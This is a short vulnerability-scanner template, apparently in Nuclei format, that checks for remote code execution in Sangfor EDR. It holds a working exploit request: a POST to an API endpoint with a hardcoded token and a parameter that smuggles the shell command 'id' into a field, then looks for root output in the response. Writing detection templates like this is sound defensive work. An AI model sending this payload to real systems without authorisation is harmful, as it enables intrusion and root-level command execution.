id: sangfor-edr-rce
info:
  name: Sangfor EDR Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template detects Remote Code Execution (RCE) vulnerability in Sangfor EDR software by exploiting an endpoint that executes commands via a POST request.
http:
  - raw:
      - |
        POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        {"params":"w=123\"''1234123''\"|id"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uid=0(root)"
        part: body
      - type: word
        words:
          - "json"
        part: header
        condition: or
